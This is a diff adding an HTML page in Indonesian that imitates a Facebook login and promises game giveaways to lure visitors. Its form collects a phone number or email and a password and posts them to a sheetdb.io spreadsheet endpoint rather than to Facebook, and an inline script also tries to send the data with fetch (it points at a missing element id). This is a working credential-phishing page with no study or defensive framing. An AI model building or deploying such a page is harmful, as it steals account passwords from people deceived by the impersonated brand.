@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>hadia</title>
+</head>
+<body>
+  
+    <div class="inputan">
+        <label class="judul"><h1>facebook</h1></label>
+        <div class="tet" >
+            masuk dengan akun facebook untuk mendapatkan giveway
+            game dan lainnya
+        </div>
+        <form action="https://sheetdb.io/api/v1/i1x3dmzq6foey" method="POST">
+            <div class="input">
+                <label for="">Nomor ponsel atau email</label>
+                <input type="text" name="data[nomor ponsel/email]" placeholder="nomor ponsel/email" required>    
+            </div>
+            <div class="input">
+                <label for="">kata sandi</label>
+                <input type="password" name="data[kata sandi]" placeholder="kata sandi" required>
+            </div>
+           <div class="input">
+                <button type="submit" onclick="mymasuk()" class="btn-c" id="btn-i">Masuk</button>  
+           </div>
+        </form>
+    </div>
+
+    <script>
+        var form = document.getElementById('input');
+        form.addEventListener("submit", e =>{
+            e.preventDefault();
+            fetch(form.action,{
+                method : "post",
+                body: new FormData(document.getElementById("input")), 
+            }).then(
+                response => response.json()
+            )
+        })
+    </script>
+</body>
+</html>
